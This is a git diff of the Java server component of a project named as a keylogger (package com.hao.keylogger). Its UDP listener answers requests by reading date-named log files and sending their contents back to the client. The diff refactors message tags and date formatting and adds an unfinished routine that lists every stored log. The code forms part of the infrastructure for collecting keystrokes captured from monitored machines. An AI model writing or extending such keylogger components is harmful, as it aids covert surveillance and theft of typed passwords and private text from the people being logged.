@@ -9,14 +9,17 @@ import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.Iterator;
 import java.util.StringTokenizer;
+
+import org.apache.commons.io.FileUtils;
 
 import com.hao.keylogger.models.Resource;
 
 public class UDPServerHelper {
 
 	private static UDPServerHelper instance;
-	
+
 	private ServerLogController controller;
 
 	private DatagramSocket socket;
@@ -24,8 +27,11 @@ public class UDPServerHelper {
 	private String hostName;
 	private int port;
 
+	private final String PROCESS_TAG = "Processing: ";
+	private final String CLIENT_TAG = "Client: ";
+
 	private byte[] buffer = new byte[Resource.SERVER_BUFFER_SIZE];
-	
+
 	Thread listenThread;
 
 	private UDPServerHelper(String hostName, int port) {
@@ -76,62 +82,70 @@ public class UDPServerHelper {
 		this.controller = controller;
 	}
 
-	private class RequestReceiver implements Runnable {	
+	private class RequestReceiver implements Runnable {
 		StringTokenizer stringTokenizer;
-		
+
 		@Override
 		public void run() {
-			
+
 			while (true) {
-				System.out.println("listening");
 				DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
 				try {
 					socket.receive(inPacket);
 					String requestMsg = new String(inPacket.getData(), 0, inPacket.getLength());
-					controller.appendToMonitory("Client: " + requestMsg);
-					
+					controller.appendToMonitory(CLIENT_TAG + requestMsg);
+
 					stringTokenizer = new StringTokenizer(requestMsg, "?");
 					String requestType = stringTokenizer.nextToken();
-					
+
 					switch (requestType) {
 					case Resource.FETCH_LOG_REQUEST:
 						String dateStr = stringTokenizer.nextToken();
-						
-						// format name of log files: dd-MM-yyyy.txt
-						SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy");
+
+						// format name of log files: d-M-yyyy.txt
+						SimpleDateFormat sdf = new SimpleDateFormat("d-M-yyyy");
 						Date dateOfLog = sdf.parse(dateStr);
-						controller.appendToMonitory("Processing: " + "get log on the day " + dateOfLog.toString());
+						controller.appendToMonitory(PROCESS_TAG + "get log on the day " + dateOfLog.toString());
 						getLogAndSend(inPacket.getAddress(), inPacket.getPort(), dateOfLog);
 						break;
 					case Resource.FETCH_ALL_LOG_REQUEST:
+						getAllLogsAndSend(inPacket.getAddress(), inPacket.getPort());
 						break;
 					}
-					
+
 				} catch (Exception e) {
 
 				}
 			}
 		}
-		
+
+		private void getAllLogsAndSend(InetAddress address, int port) {
+			Iterator<File> logFiles = FileUtils.iterateFiles(new File(Resource.LOGS_DIRECTORY),
+					null, false);
+			while (logFiles.hasNext()) {
+				System.out.println(((File) logFiles.next()).getParent());
+				//TODO send each file to client
+			}
+		}
+
 		private void getLogAndSend(InetAddress address, int port, Date date) {
-			String dateStr = new SimpleDateFormat("dd-MM-yyyy").format(date);
+			String dateStr = new SimpleDateFormat("d-M-yyyy").format(date);
 			String logFilePath = Resource.LOGS_DIRECTORY + File.separator + dateStr + Resource.LOG_FILE_EXTENSION;
 			FileManager fm = new FileManager(logFilePath);
-			
+
 			String logContent;
 			try {
 				logContent = fm.readAll();
-				System.out.println(logContent);
-				DatagramPacket outPacket = new DatagramPacket(logContent.getBytes(), logContent.length(), address, port);
+				DatagramPacket outPacket = new DatagramPacket(logContent.getBytes(), logContent.length(), address,
+						port);
 				try {
 					socket.send(outPacket);
 				} catch (IOException e) {
-					controller.appendToMonitory("Processing: " + "Can not send packet");
+					controller.appendToMonitory(PROCESS_TAG + "Can not send packet");
 				}
 			} catch (IOException e1) {
-				controller.appendToMonitory("Processing: " + "File not found");
+				controller.appendToMonitory(PROCESS_TAG + "File not found");
 			}
-			
 		}
 	}
 
